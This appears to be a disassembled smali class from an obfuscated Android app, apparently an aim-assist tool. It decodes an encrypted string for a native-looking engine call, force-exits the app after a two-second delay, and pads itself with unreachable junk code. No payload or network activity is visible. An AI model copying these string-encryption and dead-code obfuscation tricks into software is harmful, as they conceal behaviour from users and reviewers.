.class Lcom/hj/assistpro/oOO/O00O0o0O00OO$lILLl1lI1l1;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/hj/assistpro/oOO/O00O0o0O00OO;->lILLl1lI1l1(Ljava/lang/Class;)Ljava/lang/String;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic lILLl1lI1l1()V
    .locals 2

    const/16 v0, 0x3f

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/4 v1, 0x2

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, LII1iI/lILLl1lI1l1/lILLl1lI1l1/lIlL;->lILLl1lI1l1([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/aimline/pro/client/ProNEngine;->abc(Ljava/lang/String;)Ljava/lang/String;

    return-void

    nop

    :array_0
    .array-data 1
        -0x50t
        -0x5at
        -0x3ft
        -0x5et
        -0x36t
        -0x5ft
        -0x4ft
        -0x2dt
        -0x3ct
        -0x5ct
        -0x36t
        -0x2dt
        -0x3et
        -0x5et
        -0x3at
        -0x56t
        -0x4at
        -0x2ft
        -0x3at
        -0x2ct
        -0x4ct
        -0x29t
        -0x50t
        -0x55t
        -0x35t
        -0x5bt
        -0x40t
        -0x2ft
        -0x3et
        -0x59t
        -0x49t
        -0x2ft
        -0x50t
        -0x5et
        -0x3et
        -0x2dt
        -0x4at
        -0x56t
        -0x3ct
        -0x5dt
        -0x3et
        -0x30t
        -0x4at
        -0x59t
        -0x3ft
        -0x5at
        -0x3et
        -0x59t
        -0x4dt
        -0x2ft
        -0x4at
        -0x5et
        -0x4dt
        -0x5dt
        -0x50t
        -0x2ct
        -0x35t
        -0x60t
        -0x3ct
        -0x5at
        -0x4ft
        -0x55t
        -0x3ft
    .end array-data

    :array_1
    .array-data 1
        -0xet
        -0x6et
    .end array-data
.end method


# virtual methods
.method public run()V
    .locals 3

    const-wide/16 v0, 0x7d0

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_0
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/System;->exit(I)V

    new-instance v1, Ljava/lang/Thread;

    sget-object v2, Lcom/hj/assistpro/oOO/OO0O0O0O0OOOO;->lIlL:Lcom/hj/assistpro/oOO/OO0O0O0O0OOOO;

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    :goto_1
    const/16 v1, 0x64

    if-ge v0, v1, :cond_1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_0

    add-int/lit8 v0, v0, -0x1

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_1
    return-void
.end method
